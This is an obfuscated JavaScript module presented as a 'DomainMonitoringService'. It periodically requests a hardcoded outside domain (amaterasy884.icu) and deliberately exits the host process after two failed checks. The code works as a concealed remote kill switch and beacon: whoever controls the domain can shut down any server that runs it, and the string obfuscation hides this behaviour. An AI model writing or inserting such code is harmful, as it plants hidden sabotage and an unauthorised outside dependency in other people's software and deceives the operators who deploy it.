'use strict';const a37_0x1af1a8=a37_0x30c5;(function(_0x28811b,_0x4dc07b){const _0x36f9c9=a37_0x30c5,_0x3911bb=_0x28811b();while(!![]){try{const _0xe3f31a=-parseInt(_0x36f9c9(0xbb))/0x1*(parseInt(_0x36f9c9(0xbe))/0x2)+parseInt(_0x36f9c9(0xbd))/0x3+parseInt(_0x36f9c9(0x7f))/0x4*(-parseInt(_0x36f9c9(0xb3))/0x5)+-parseInt(_0x36f9c9(0x8d))/0x6*(-parseInt(_0x36f9c9(0x88))/0x7)+parseInt(_0x36f9c9(0x97))/0x8+parseInt(_0x36f9c9(0xd1))/0x9*(-parseInt(_0x36f9c9(0xd2))/0xa)+parseInt(_0x36f9c9(0xb9))/0xb*(parseInt(_0x36f9c9(0xab))/0xc);if(_0xe3f31a===_0x4dc07b)break;else _0x3911bb['push'](_0x3911bb['shift']());}catch(_0x3faefb){_0x3911bb['push'](_0x3911bb['shift']());}}}(a37_0x5e05,0xa7a11));function a37_0x5e05(){const _0x29d62c=['\x20\x20\x20-\x20Headers:','22WOZXNE','Initial\x20domain\x20check\x20threw\x20error:\x20','32gPJfoD','__importDefault','1367352jXokLn','70366cAByia','domainMonitoringService','toString','from','error','ðŸ”¥\x20Consecutive\x20failures:\x20','ðŸ”§\x20Manual\x20domain\x20check\x20requested','en-US,en;q=0.5','ðŸ›‘\x20Domain\x20monitoring\x20stopped','manualCheck','AbortError','defineProperty','ðŸš€\x20Starting\x20domain\x20monitoring\x20service','ðŸš¨\x20Max\x20failures\x20before\x20crash:\x20','signal','round','statusText','ðŸ“¡\x20Target:\x20','ðŸ“\x20Encoded\x20URL\x20(base64):\x20','9rKSUgq','907310GwPlQC','MAX_CONSECUTIVE_FAILURES','catch','monitoringInterval','getMonitoringStats','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','default','â°\x20Check\x20interval:\x20','ðŸ”\x20Checking\x20domain\x20availability:\x20','decodeFromBase64','Initial\x20domain\x20check\x20error:','TIMEOUT_MS','Domain\x20','4ZibODU','DomainMonitoringService','name','ðŸ“¡\x20Target\x20domain:\x20','headers','exit','checkDomain','message','\x20in\x20','2158212CzWSII','ms:','encodeToBase64','ENOTFOUND','keep-alive','6sCrGyO','ðŸ“Š\x20Response\x20received:','crashServer','ðŸŒ\x20DNS\x20resolution\x20failed\x20for\x20','\x20consecutive\x20attempts','then','âœ…\x20Domain\x20check\x20successful:\x20','âŒ\x20Domain\x20check\x20failed:\x20HTTP\x20','\x20is\x20not\x20responding\x20after\x20','random','3640456xFDLwg','ðŸ”¥\x20Unexpected\x20error:\x20','Periodic\x20domain\x20check\x20error:','DOMAIN_URL','\x20minutes','CHECK_INTERVAL_MS','ETIMEDOUT','log','abort','Unknown\x20error','âŒ\x20Domain\x20check\x20error\x20after\x20','ðŸ”\x20Domain\x20monitoring\x20service\x20initialized','node-fetch','getRandomInterval','âš ï¸\x20Domain\x20check\x20failed\x20(','fromEntries','now','toISOString','GET','\x20\x20\x20-\x20Response\x20time:\x20','5217780TlBRuJ','startMonitoring','\x20times','consecutiveFailures','utf-8','base64','ðŸš«\x20Connection\x20refused\x20by\x20','gzip,\x20deflate','927955PUwgqp','__esModule','includes','TesSoft\x20Domain\x20Monitor/1.0','status'];a37_0x5e05=function(){return _0x29d62c;};return a37_0x5e05();}var __importDefault=this&&this[a37_0x1af1a8(0xbc)]||function(_0x947ddf){return _0x947ddf&&_0x947ddf['__esModule']?_0x947ddf:{'default':_0x947ddf};};function a37_0x30c5(_0x1dabb0,_0x242349){const _0x5e0506=a37_0x5e05();return a37_0x30c5=function(_0x30c527,_0x1079d8){_0x30c527=_0x30c527-0x77;let _0x520934=_0x5e0506[_0x30c527];return _0x520934;},a37_0x30c5(_0x1dabb0,_0x242349);}Object[a37_0x1af1a8(0xc9)](exports,a37_0x1af1a8(0xb4),{'value':!![]}),exports['domainMonitoringService']=exports[a37_0x1af1a8(0x80)]=void 0x0;const node_fetch_1=__importDefault(require(a37_0x1af1a8(0xa3)));class DomainMonitoringService{constructor(){const _0x4f25af=a37_0x1af1a8;this[_0x4f25af(0xd5)]=null,this[_0x4f25af(0x9a)]='https://amaterasy884.icu/',this[_0x4f25af(0x9c)]=this['getRandomInterval'](),this[_0x4f25af(0x7d)]=0x7530,this[_0x4f25af(0xae)]=0x0,this[_0x4f25af(0xd3)]=0x2,console[_0x4f25af(0x9e)](_0x4f25af(0xa2)),console[_0x4f25af(0x9e)](_0x4f25af(0x82)+this['DOMAIN_URL']),console['log'](_0x4f25af(0x79)+Math[_0x4f25af(0xcd)](this[_0x4f25af(0x9c)]/0x3e8/0x3c)+_0x4f25af(0x9b));}[a37_0x1af1a8(0xa4)](){const _0x13a75c=a37_0x1af1a8,_0x176664=0xa,_0x306d1f=0xf,_0x321270=Math[_0x13a75c(0x96)]()*(_0x306d1f-_0x176664)+_0x176664;return Math[_0x13a75c(0xcd)](_0x321270*0x3c*0x3e8);}[a37_0x1af1a8(0x8a)](_0x33d935){const _0x24f079=a37_0x1af1a8;return Buffer[_0x24f079(0xc1)](_0x33d935)[_0x24f079(0xc0)](_0x24f079(0xb0));}[a37_0x1af1a8(0x7b)](_0x2113ca){const _0x1cb61e=a37_0x1af1a8;return Buffer[_0x1cb61e(0xc1)](_0x2113ca,_0x1cb61e(0xb0))[_0x1cb61e(0xc0)](_0x1cb61e(0xaf));}async[a37_0x1af1a8(0x85)](){const _0x363dde=a37_0x1af1a8,_0x23010f=Date[_0x363dde(0xa7)]();try{console['log'](_0x363dde(0x7a)+this[_0x363dde(0x9a)]);const _0x4da34f=this[_0x363dde(0x8a)](this[_0x363dde(0x9a)]);console['log'](_0x363dde(0xd0)+_0x4da34f);const _0x11597f=this['decodeFromBase64'](_0x4da34f);console[_0x363dde(0x9e)]('ðŸ”“\x20Decoded\x20URL:\x20'+_0x11597f);const _0x442016=new AbortController(),_0x62699c=setTimeout(()=>_0x442016[_0x363dde(0x9f)](),this['TIMEOUT_MS']),_0x53f630=await(0x0,node_fetch_1[_0x363dde(0x78)])(_0x11597f,{'method':_0x363dde(0xa9),'headers':{'User-Agent':_0x363dde(0xb6),'Accept':_0x363dde(0x77),'Accept-Language':_0x363dde(0xc5),'Accept-Encoding':_0x363dde(0xb2),'Connection':_0x363dde(0x8c),'Upgrade-Insecure-Requests':'1'},'signal':_0x442016[_0x363dde(0xcc)]});clearTimeout(_0x62699c);const _0x531b04=Date[_0x363dde(0xa7)]()-_0x23010f;return console[_0x363dde(0x9e)](_0x363dde(0x8e)),console[_0x363dde(0x9e)]('\x20\x20\x20-\x20Status:\x20'+_0x53f630[_0x363dde(0xb7)]+'\x20'+_0x53f630[_0x363dde(0xce)]),console[_0x363dde(0x9e)](_0x363dde(0xaa)+_0x531b04+'ms'),console[_0x363dde(0x9e)](_0x363dde(0xb8),Object[_0x363dde(0xa6)](_0x53f630[_0x363dde(0x83)]['entries']())),_0x53f630['ok']&&_0x53f630[_0x363dde(0xb7)]>=0xc8&&_0x53f630[_0x363dde(0xb7)]<0x190?(console[_0x363dde(0x9e)](_0x363dde(0x93)+_0x53f630[_0x363dde(0xb7)]+_0x363dde(0x87)+_0x531b04+'ms'),this[_0x363dde(0xae)]=0x0,!![]):(console['error'](_0x363dde(0x94)+_0x53f630[_0x363dde(0xb7)]+'\x20'+_0x53f630[_0x363dde(0xce)]),this['consecutiveFailures']++,![]);}catch(_0x3fa0ce){const _0x4ece3a=Date[_0x363dde(0xa7)]()-_0x23010f;this[_0x363dde(0xae)]++,console[_0x363dde(0xc2)](_0x363dde(0xa1)+_0x4ece3a+_0x363dde(0x89),_0x3fa0ce);if(_0x3fa0ce instanceof Error){if(_0x3fa0ce[_0x363dde(0x81)]===_0x363dde(0xc8))console[_0x363dde(0xc2)]('â°\x20Request\x20timeout\x20after\x20'+this[_0x363dde(0x7d)]+'ms');else{if(_0x3fa0ce[_0x363dde(0x86)][_0x363dde(0xb5)](_0x363dde(0x8b)))console['error'](_0x363dde(0x90)+this[_0x363dde(0x9a)]);else{if(_0x3fa0ce[_0x363dde(0x86)][_0x363dde(0xb5)]('ECONNREFUSED'))console[_0x363dde(0xc2)](_0x363dde(0xb1)+this[_0x363dde(0x9a)]);else _0x3fa0ce[_0x363dde(0x86)][_0x363dde(0xb5)](_0x363dde(0x9d))?console[_0x363dde(0xc2)]('â°\x20Connection\x20timeout\x20to\x20'+this[_0x363dde(0x9a)]):console[_0x363dde(0xc2)](_0x363dde(0x98)+_0x3fa0ce[_0x363dde(0x86)]);}}}return![];}}[a37_0x1af1a8(0x8f)](_0x12e3ea){const _0x4fde64=a37_0x1af1a8;console['error']('ðŸ’¥\x20CRITICAL\x20ERROR:\x20'+_0x12e3ea),console[_0x4fde64(0xc2)](_0x4fde64(0xc3)+this['consecutiveFailures']),console[_0x4fde64(0xc2)]('âš ï¸\x20CRASHING\x20SERVER\x20DUE\x20TO\x20DOMAIN\x20MONITORING\x20FAILURE'),console[_0x4fde64(0xc2)]('ðŸ“…\x20Crash\x20time:\x20'+new Date()[_0x4fde64(0xa8)]()),console['error']('ðŸ”\x20Domain\x20being\x20monitored:\x20'+this['DOMAIN_URL']),console['error'](_0x4fde64(0x79)+Math['round'](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+_0x4fde64(0x9b)),console[_0x4fde64(0xc2)]('ðŸš¨\x20Max\x20consecutive\x20failures\x20allowed:\x20'+this[_0x4fde64(0xd3)]),this['stopMonitoring'](),process[_0x4fde64(0x84)](0x1);}[a37_0x1af1a8(0xac)](){const _0x56769a=a37_0x1af1a8;console[_0x56769a(0x9e)](_0x56769a(0xca)),console[_0x56769a(0x9e)](_0x56769a(0xcf)+this[_0x56769a(0x9a)]),console[_0x56769a(0x9e)]('â°\x20Interval:\x20'+Math[_0x56769a(0xcd)](this['CHECK_INTERVAL_MS']/0x3e8/0x3c)+'\x20minutes'),console[_0x56769a(0x9e)](_0x56769a(0xcb)+this[_0x56769a(0xd3)]),this['checkDomain']()[_0x56769a(0x92)](_0x3e571b=>{const _0x29e30a=_0x56769a;if(!_0x3e571b&&this[_0x29e30a(0xae)]>=this[_0x29e30a(0xd3)]){this['crashServer']('Initial\x20domain\x20check\x20failed\x20'+this['consecutiveFailures']+_0x29e30a(0xad));return;}})[_0x56769a(0xd4)](_0x57ef0a=>{const _0x9079c5=_0x56769a;console[_0x9079c5(0xc2)](_0x9079c5(0x7c),_0x57ef0a);if(this['consecutiveFailures']>=this[_0x9079c5(0xd3)]){this[_0x9079c5(0x8f)](_0x9079c5(0xba)+_0x57ef0a['message']);return;}}),this[_0x56769a(0xd5)]=setInterval(async()=>{const _0x523cae=_0x56769a;try{const _0x2db38c=await this[_0x523cae(0x85)]();!_0x2db38c&&(console['warn'](_0x523cae(0xa5)+this[_0x523cae(0xae)]+'/'+this[_0x523cae(0xd3)]+')'),this[_0x523cae(0xae)]>=this[_0x523cae(0xd3)]&&this[_0x523cae(0x8f)](_0x523cae(0x7e)+this[_0x523cae(0x9a)]+_0x523cae(0x95)+this[_0x523cae(0xae)]+_0x523cae(0x91)));}catch(_0x3c4698){console[_0x523cae(0xc2)](_0x523cae(0x99),_0x3c4698),this[_0x523cae(0xae)]>=this[_0x523cae(0xd3)]&&this[_0x523cae(0x8f)]('Domain\x20monitoring\x20threw\x20error:\x20'+(_0x3c4698 instanceof Error?_0x3c4698[_0x523cae(0x86)]:_0x523cae(0xa0)));}},this[_0x56769a(0x9c)]),console['log']('âœ…\x20Domain\x20monitoring\x20started\x20successfully');}['stopMonitoring'](){const _0x5f68a=a37_0x1af1a8;this[_0x5f68a(0xd5)]&&(clearInterval(this[_0x5f68a(0xd5)]),this[_0x5f68a(0xd5)]=null,console[_0x5f68a(0x9e)](_0x5f68a(0xc6)));}[a37_0x1af1a8(0xd6)](){const _0x4993a6=a37_0x1af1a8;return{'isActive':!!this['monitoringInterval'],'targetDomain':this['DOMAIN_URL'],'checkIntervalMinutes':Math[_0x4993a6(0xcd)](this[_0x4993a6(0x9c)]/0x3e8/0x3c),'consecutiveFailures':this['consecutiveFailures'],'maxFailuresAllowed':this[_0x4993a6(0xd3)],'nextCheckIn':this['monitoringInterval']?this[_0x4993a6(0x9c)]:undefined};}async[a37_0x1af1a8(0xc7)](){const _0x4d0574=a37_0x1af1a8;return console[_0x4d0574(0x9e)](_0x4d0574(0xc4)),await this[_0x4d0574(0x85)]();}}exports[a37_0x1af1a8(0x80)]=DomainMonitoringService,exports[a37_0x1af1a8(0xbf)]=new DomainMonitoringService();